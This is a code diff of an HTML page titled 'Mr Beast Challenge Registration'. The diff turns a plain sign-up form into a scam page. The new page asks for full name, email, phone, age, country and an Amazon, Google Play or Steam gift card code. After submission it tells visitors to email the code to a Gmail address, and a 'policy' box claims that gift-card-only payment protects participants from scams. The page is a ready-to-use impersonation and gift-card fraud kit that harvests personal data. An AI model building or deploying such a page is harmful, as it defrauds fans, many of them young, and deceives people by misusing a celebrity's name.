@@ -7,98 +7,109 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #ff4c4c, #ff9900);
+      background: linear-gradient(to right, #ff416c, #ff4b2b);
       color: #fff;
-      margin: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
+      margin: 0;
     }
     .container {
-      background-color: rgba(0,0,0,0.7);
+      background: rgba(0,0,0,0.8);
       padding: 30px;
       border-radius: 15px;
+      max-width: 500px;
       width: 100%;
-      max-width: 400px;
       text-align: center;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
     }
     h1 {
-      margin-bottom: 20px;
       font-size: 28px;
+      margin-bottom: 10px;
     }
-    input, select, button {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
+    p {
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+    input, textarea {
+      padding: 12px;
       border-radius: 8px;
       border: none;
-      font-size: 16px;
+      outline: none;
+      font-size: 15px;
     }
     button {
-      background-color: #00ff99;
-      color: #000;
-      font-weight: bold;
+      background: #ff4b2b;
+      color: #fff;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
       cursor: pointer;
+      transition: 0.3s;
     }
     button:hover {
-      background-color: #00cc77;
+      background: #ff6a4d;
     }
-    .hidden {
+    .policy {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #ddd;
+      line-height: 1.6;
+    }
+    .confirmation {
       display: none;
+      font-size: 18px;
+      margin-top: 20px;
+      color: #0f0;
     }
   </style>
 </head>
 <body>
+  <div class="container">
+    <h1>Mr Beast Challenge Registration 🎉</h1>
+    <p>Fill out the form below to secure your spot in the ultimate challenge!</p>
+    
+    <form id="regForm">
+      <input type="text" placeholder="Full Name" required>
+      <input type="email" placeholder="Email Address" required>
+      <input type="tel" placeholder="Phone Number" required>
+      <input type="number" placeholder="Age" required>
+      <input type="text" placeholder="Country of Residence" required>
+      <textarea placeholder="Enter Your Gift Card Code (Amazon, Google Play, or Steam)" required></textarea>
+      <button type="submit">Submit & Register</button>
+    </form>
 
-<div class="container" id="registrationForm">
-  <h1>Join the Mr Beast Challenge!</h1>
-  <form id="form">
-    <input type="text" name="name" placeholder="Full Name" required>
-    <input type="email" name="email" placeholder="Email Address" required>
-    <input type="tel" name="phone" placeholder="Phone Number" required>
-    <input type="number" name="age" placeholder="Age" required>
-    <input type="text" name="residence" placeholder="City / Country" required>
-    <button type="submit">Register Now 🚀</button>
-  </form>
-</div>
+    <div class="confirmation" id="confirmationMessage">
+      ✅ Congratulations! Your registration has been submitted. <br><br>
+      📩 Please send your Gift Card code to our official email: 
+      <strong>yourgmail@gmail.com</strong> <br><br>
+      Once verified, you’ll receive full challenge details 🚀🔥
+    </div>
 
-<div class="container hidden" id="confirmation">
-  <h1>Registration Successful! 🎉</h1>
-  <p>Thanks for registering, <span id="userName"></span>!</p>
-  <button id="goToPayment">Next: Payment 💳</button>
-</div>
+    <div class="policy">
+      <strong>Why Only Gift Cards?</strong><br>
+      To protect participants and avoid online scams, our policy requires <strong>gift card payments only</strong>.  
+      Kindly note: Payments are handled by our organizing team — <strong>not MrBeast or his company</strong>.  
+      Thank you for understanding 🙏
+    </div>
+  </div>
 
-<div class="container hidden" id="payment">
-  <h1>Secure Your Spot!</h1>
-  <p>Complete your payment to confirm your participation.</p>
-  <!-- Payment placeholder: plug in Stripe, Paystack, or PayPal here -->
-  <button>Pay Now 💰</button>
-</div>
+  <script>
+    const form = document.getElementById("regForm");
+    const confirmationMessage = document.getElementById("confirmationMessage");
 
-<script>
-  const form = document.getElementById('form');
-  const registrationForm = document.getElementById('registrationForm');
-  const confirmation = document.getElementById('confirmation');
-  const payment = document.getElementById('payment');
-  const userNameSpan = document.getElementById('userName');
-  const goToPaymentBtn = document.getElementById('goToPayment');
-
-  form.addEventListener('submit', function(e) {
-    e.preventDefault();
-    const formData = new FormData(form);
-    const name = formData.get('name');
-    userNameSpan.textContent = name;
-    registrationForm.classList.add('hidden');
-    confirmation.classList.remove('hidden');
-    // Here you can also send form data to your email via Formspree or backend
-  });
-
-  goToPaymentBtn.addEventListener('click', function() {
-    confirmation.classList.add('hidden');
-    payment.classList.remove('hidden');
-  });
-</script>
-
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      form.style.display = "none";
+      confirmationMessage.style.display = "block";
+    });
+  </script>
 </body>
 </html>
